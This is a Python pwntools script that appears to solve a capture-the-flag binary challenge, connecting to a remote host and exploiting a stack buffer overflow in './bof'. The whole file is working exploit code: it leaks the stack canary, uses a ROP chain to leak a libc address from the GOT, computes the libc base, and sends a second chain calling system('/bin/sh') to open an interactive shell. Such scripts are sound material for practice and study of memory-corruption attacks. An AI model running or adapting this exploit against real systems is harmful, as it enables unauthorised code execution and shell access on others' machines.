
from pwn import *

'''
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE(0x400000)
'''

context(arch="amd64", os='linux')
e = ELF('./bof')

r = remote("pwn.h4ckingga.me", 10002)

print(r.recv())

dummy = b"A"*0x118
print("-- leak canary --")
r.send(dummy+b"A")
r.recvuntil(b'A'*0x119)
canary = r.recv(7)
print("recv: " ,canary)
canary = u64(b"\x00"+canary)
print("canary: ", hex(canary))

r.recvuntil("comment : ")

dummy = b"A"*0x108
pop_rdi = p64(0x401343)
ret = p64(0x40101a)

payload  = dummy
payload += p64(canary)
payload += b"A"*8
payload += pop_rdi
payload += p64(e.got['read'])
payload += p64(e.plt['puts'])
payload += p64(e.symbols['main'])

print("-- leak got --")
r.sendline(payload)
base = u64(r.recv(6)+b"\x00\x00") - 0x111130
print("base : ", hex(base))


print("-- main again --")
print(r.recvuntil("What's your name?\n"))
r.sendline("AAAAA")
print(r.recvuntil("comment : "))

system = p64(base + 0x055410)
binsh = p64(base + 0x1b75aa)

payload  = dummy
payload += p64(canary)
payload += ret*4
payload += pop_rdi
payload += binsh
payload += system

r.sendline(payload)

r.interactive()
